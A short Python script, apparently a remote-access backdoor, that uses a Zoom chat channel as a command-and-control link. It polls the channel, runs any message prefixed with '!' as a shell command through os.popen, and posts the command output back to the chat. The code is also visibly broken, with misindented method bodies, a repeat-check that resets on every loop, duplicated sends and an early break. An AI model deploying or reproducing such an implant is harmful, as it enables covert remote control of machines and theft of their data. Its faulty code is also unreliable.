#!/bin/python3
import requests
from requests.auth import HTTPBasicAuth
from os import popen
from time import sleep

chat_id = ''
access_token = ''

class zoom:
    def __init__(self, access_token):
        self.access_token = access_token

    def send_message(self, message, chat):
    url = 'https://api.zoom.us/v2/chat/users/me/messages'
    data = {"message": message, "to_channel": chat}
    r = requests.post(url, json=data,
    headers={"authorization" : f"Bearer {self.access_token}"})
    return r.json()

    def get_messages(self, chat, next_page=None):
        url = 'https://api.zoom.us/v2/chat/users/me/messages'
        data = {"page_size": 50,"to_channel": chat,"next_page_token": next_page}
        r = requests.get(url, params=data,
        headers={"authorization" :f"Bearer {self.access_token}"})
    return r.json()

zm = zoom(access_token)

while True:
    sleep(1)
    old_id = ''
    msgs = zm.get_messages(chat_id)
    msg = msgs['messages'][0]
    if msg['id'] == old_id:
        sleep(4)
        continue

    old_id = msg['id']
    cmd = msg['message']

    if not cmd.startswith('!'):
        sleep(4)
        continue
    cmd = cmd[1:]
    out = popen(cmd).read()
    for i in range(0, len(out), 1024):
        next = i + 1024
        if next >= len(out):
            next = len(out)			
        zm.send_message(out[i:next],chat_id)
    zm.send_message(out,chat_id)
    break
